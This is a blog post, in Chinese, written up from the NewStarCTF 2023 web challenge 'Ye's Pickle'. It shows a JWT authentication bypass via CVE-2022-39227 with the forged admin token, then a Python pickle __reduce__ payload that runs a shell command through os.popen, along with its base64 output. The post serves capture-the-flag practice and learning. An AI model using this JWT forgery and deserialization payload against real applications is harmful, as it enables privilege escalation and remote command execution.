@@ -1,0 +1,203 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>[NewStarCTF-2023-公开赛道]Yes-Pickle | SoulfulVoyager</title><meta name="author" content="Abernethy"><meta name="copyright" content="Abernethy"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="[NewStarCTF 2023 公开赛道]Ye’s Pickle下载题目的附件 https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1CmfsZI4r7bg6xch36TtTCw?pwd&#x3D;NNUS 提取码：NNUS  分析代码文件  根路由(“&#x2F;“)：检查查询参数 token。如果存在，它会验证JWT并在会话中设置用户角色。如果不存在，它会将用户角色设置为”guest”，生成一个新的JWT">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[NewStarCTF-2023-公开赛道]Yes-Pickle">
+<meta property="og:url" content="https://sebastian-alphax.github.io/2025/08/22/NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-Yes-Pickle/index.html">
+<meta property="og:site_name" content="SoulfulVoyager">
+<meta property="og:description" content="[NewStarCTF 2023 公开赛道]Ye’s Pickle下载题目的附件 https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1CmfsZI4r7bg6xch36TtTCw?pwd&#x3D;NNUS 提取码：NNUS  分析代码文件  根路由(“&#x2F;“)：检查查询参数 token。如果存在，它会验证JWT并在会话中设置用户角色。如果不存在，它会将用户角色设置为”guest”，生成一个新的JWT">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://sebastian-alphax.github.io/img/icon.png">
+<meta property="article:published_time" content="2025-08-21T17:09:42.000Z">
+<meta property="article:modified_time" content="2025-08-21T17:11:11.164Z">
+<meta property="article:author" content="Abernethy">
+<meta property="article:tag" content="NewStarCTF 2023">
+<meta property="article:tag" content="Ye&#39;s Pickle">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sebastian-alphax.github.io/img/icon.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "[NewStarCTF-2023-公开赛道]Yes-Pickle",
+  "url": "https://sebastian-alphax.github.io/2025/08/22/NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-Yes-Pickle/",
+  "image": "https://sebastian-alphax.github.io/img/icon.png",
+  "datePublished": "2025-08-21T17:09:42.000Z",
+  "dateModified": "2025-08-21T17:11:11.164Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Abernethy",
+      "url": "https://sebastian-alphax.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/icons8.png"><link rel="canonical" href="https://sebastian-alphax.github.io/2025/08/22/NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-Yes-Pickle/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '[NewStarCTF-2023-公开赛道]Yes-Pickle',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">SoulfulVoyager</span></a><a class="nav-page-title" href="/"><span class="site-name">[NewStarCTF-2023-公开赛道]Yes-Pickle</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">[NewStarCTF-2023-公开赛道]Yes-Pickle</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-08-21T17:09:42.000Z" title="Created 2025-08-22 01:09:42">2025-08-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-08-21T17:11:11.164Z" title="Updated 2025-08-22 01:11:11">2025-08-22</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/NewStarCTF-2023/">NewStarCTF 2023</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/NewStarCTF-2023/web/">web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="NewStarCTF-2023-公开赛道-Ye’s-Pickle"><a href="#NewStarCTF-2023-公开赛道-Ye’s-Pickle" class="headerlink" title="[NewStarCTF 2023 公开赛道]Ye’s Pickle"></a>[NewStarCTF 2023 公开赛道]Ye’s Pickle</h1><p>下载题目的附件</p>
+<p><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1CmfsZI4r7bg6xch36TtTCw?pwd=NNUS">https://pan.baidu.com/s/1CmfsZI4r7bg6xch36TtTCw?pwd=NNUS</a> 提取码：NNUS</p>
+<p><img src="/./NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-Yes-Pickle/image-20240327172534776.png" alt="image-20240327172534776"></p>
+<p>分析代码文件</p>
+<ul>
+<li>根路由(“&#x2F;“)：检查查询参数 <code>token</code>。如果存在，它会验证JWT并在会话中设置用户角色。如果不存在，它会将用户角色设置为”guest”，生成一个新的JWT，并将其传递给渲染的<code>index.html</code>模板。</li>
+<li>“&#x2F;pickle”路由：如果会话中的用户角色为”admin”，则会对传入的<code>pickle</code>查询参数进行反序列化。</li>
+</ul>
+<p>所以，先将role置为admin，然后传入pickle进行反序列化。</p>
+<p><img src="/./NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-Yes-Pickle/image-20240327172353746.png" alt="image-20240327172353746"></p>
+<p>打开题目链接</p>
+<p>将token进行jwt解码</p>
+<p><img src="/./NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-Yes-Pickle/image-20240327173433340.png" alt="image-20240327173433340"></p>
+<p>此时，role为guest</p>
+<p>此处利用CVE-2022-39227漏洞进行JWT身份验证绕过</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python cve_2022_39227.py -j eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTE1MzA0MjEsImlhdCI6MTcxMTUyNjgyMSwianRpIjoiWUpiMTJqckxRN1kxNlVZVjZVUjNnUSIsIm5iZiI6MTcxMTUyNjgyMSwicm9sZSI6Imd1ZXN0IiwidXNlcm5hbWUiOiJib29naXBvcCJ9.S7-Ttiqb3QVDz2476oTJtHebQ7i5gNWm1aWIBND7iaFiGSMBn6S0lReftdTU8w3CVCaHHw-l9P4JFVNsJClPGv9S2JxwVwPXm0DZNPTZx9DJKUoC9wKT6K9Me3BuX48k7cO_cXgPvMDz9LAPCi-6XcT2gX5PEX0M9Nnf-W3Ydhi0fgcqA3MFwTAN-c8n52cAb-JixEm7Tqi2qnjP-3HeEZi2gWXmilJCt_XoK_WQ3Cn3bOhZOGhZcJ0FhvYuVW1330HI26FEAgZuaCxtGXYaWpbO9zzOTxgkyM7-sIYhEXCVbTS4l28QSfuvt8yGehySeCN7S9NCrmJ6qG0I9hqzUQ -i role=admin</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-Yes-Pickle/image-20240327173852758.png" alt="image-20240327173852758"></p>
+<p>得到变换之后的token为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auth=&#123;&quot;  eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTE1MzA0MjEsImlhdCI6MTcxMTUyNjgyMSwianRpIjoiWUpiMTJqckxRN1kxNlVZVjZVUjNnUSIsIm5iZiI6MTcxMTUyNjgyMSwicm9sZSI6ImFkbWluIiwidXNlcm5hbWUiOiJib29naXBvcCJ9.&quot;:&quot;&quot;,&quot;protected&quot;:&quot;eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9&quot;, &quot;payload&quot;:&quot;eyJleHAiOjE3MTE1MzA0MjEsImlhdCI6MTcxMTUyNjgyMSwianRpIjoiWUpiMTJqckxRN1kxNlVZVjZVUjNnUSIsIm5iZiI6MTcxMTUyNjgyMSwicm9sZSI6Imd1ZXN0IiwidXNlcm5hbWUiOiJib29naXBvcCJ9&quot;,&quot;signature&quot;:&quot;S7-Ttiqb3QVDz2476oTJtHebQ7i5gNWm1aWIBND7iaFiGSMBn6S0lReftdTU8w3CVCaHHw-l9P4JFVNsJClPGv9S2JxwVwPXm0DZNPTZx9DJKUoC9wKT6K9Me3BuX48k7cO_cXgPvMDz9LAPCi-6XcT2gX5PEX0M9Nnf-W3Ydhi0fgcqA3MFwTAN-c8n52cAb-JixEm7Tqi2qnjP-3HeEZi2gWXmilJCt_XoK_WQ3Cn3bOhZOGhZcJ0FhvYuVW1330HI26FEAgZuaCxtGXYaWpbO9zzOTxgkyM7-sIYhEXCVbTS4l28QSfuvt8yGehySeCN7S9NCrmJ6qG0I9hqzUQ&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-Yes-Pickle/image-20240327174011931.png" alt="image-20240327174011931"></p>
+<p>get方式传参，然后抓包</p>
+<p><img src="/./NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-Yes-Pickle/image-20240327174624574.png" alt="image-20240327174624574"></p>
+<p>此时，我们查看网页的cookie信息</p>
+<p><img src="/./NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-Yes-Pickle/image-20240327174731106.png" alt="image-20240327174731106"></p>
+<p><img src="/./NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-Yes-Pickle/image-20240327174806572.png" alt="image-20240327174806572"></p>
+<p>已经转化为admin</p>
+<p>然后，我们进一步在pickle路由下面反序列化</p>
+<p>报错回显</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">      <span class="keyword">return</span> (<span class="built_in">exec</span>,(<span class="string">&quot;raise Exception(__import__(&#x27;os&#x27;).popen(&#x27;cat fla*&#x27;).read())&quot;</span>,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">poc = base64.b64encode(pickle.dumps(A()))</span><br><span class="line"><span class="built_in">print</span>(poc)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;gASVVgAAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlIw6cmFpc2UgRXhjZXB0aW9uKF9faW1wb3J0X18oJ29zJykucG9wZW4oJ2NhdCBmbGEqJykucmVhZCgpKZSFlFKULg==&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-Yes-Pickle/image-20240327175245956.png" alt="image-20240327175245956"></p>
+<p>注意cookie中session的值为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJyb2xlIjoiYWRtaW4ifQ.ZgPrIg.SG6DW5FYBLmOUM9rMzG7CMNNT-g</span><br></pre></td></tr></table></figure>
+
+<h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><p><a target="_blank" rel="noopener" href="https://www.yuque.com/zacarx007/civwlr/aiy8ccp6rl68lucf?singleDoc#">Newstar Ye’s Pickle Python无回显不出网</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_73512445/article/details/133694293">[NewStarCTF 2023] web题解</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://sebastian-alphax.github.io">Abernethy</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://sebastian-alphax.github.io/2025/08/22/NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-Yes-Pickle/">https://sebastian-alphax.github.io/2025/08/22/NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-Yes-Pickle/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/NewStarCTF-2023/">NewStarCTF 2023</a><a class="post-meta__tags" href="/tags/Ye-s-Pickle/">Ye's Pickle</a></div><div class="post-share"><div class="social-share" data-image="/img/icon.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/07/19/CVE-2024-2961/" title="CVE-2024-2961"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">CVE-2024-2961</div></div><div class="info-2"><div class="info-item-1">PHP文件读取到远程代码执行漏洞分析（CVE-2024-2961）漏洞背景CVE-2024-2961概述 漏洞类型：GNU C库(glibc)中iconv()函数的缓冲区溢出漏洞 影响范围： 影响PHP 7.0.0(2015)到8.3.7(2024)近十年版本   漏洞原理： 在将字符串转换为ISO-2022-CN-EXT字符集时 可能导致输出缓冲区溢出最多4个字节 可能使应用程序崩溃或覆盖相邻变量   利用场景： 通过php://filter协议利用漏洞 将文件读取原语提升到远程代码执行(RCE)    相关PHP漏洞 多字节字符处理函数中的逻辑缺陷： mb_strpos()：遇到%9f等不可见字符时自动忽略 mb_substr()：将%f0及后续字符视为单个字符   利用特性： %9f用于增加一个字符计数 %f0用于减少三个字符计数 可实现任意字符构造和字符串逃逸     12mb_strpos这个函数在遇到 %9f 这个不可见字符时，会自动忽略mb_substr会把 %f0 连着后面的三个字符当成一个字符来识别 Attention： https://www.cnblogs....</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Abernethy</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Sebastian-AlphaX"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Sebastian-AlphaX" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:2926295043@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-Ye%E2%80%99s-Pickle"><span class="toc-number">1.</span> <span class="toc-text">[NewStarCTF 2023 公开赛道]Ye’s Pickle</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%95%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">引用</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/08/22/NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-Yes-Pickle/" title="[NewStarCTF-2023-公开赛道]Yes-Pickle">[NewStarCTF-2023-公开赛道]Yes-Pickle</a><time datetime="2025-08-21T17:09:42.000Z" title="Created 2025-08-22 01:09:42">2025-08-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/19/CVE-2024-2961/" title="CVE-2024-2961">CVE-2024-2961</a><time datetime="2025-07-19T07:20:08.000Z" title="Created 2025-07-19 15:20:08">2025-07-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/07/19/LZCTF2025/" title="LZCTF2025"><img src="/2025/07/19/LZCTF2025/PixPin_2025-07-19_12-22-54.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="LZCTF2025"/></a><div class="content"><a class="title" href="/2025/07/19/LZCTF2025/" title="LZCTF2025">LZCTF2025</a><time datetime="2025-07-19T02:23:39.000Z" title="Created 2025-07-19 10:23:39">2025-07-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/15/hello-world/" title="Hello World">Hello World</a><time datetime="2025-07-15T02:59:01.677Z" title="Created 2025-07-15 10:59:01">2025-07-15</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 By Abernethy</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
